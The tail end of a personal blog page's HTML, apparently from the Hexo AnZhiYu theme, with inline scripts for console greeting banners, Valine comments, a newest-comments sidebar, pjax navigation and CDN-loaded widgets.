      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>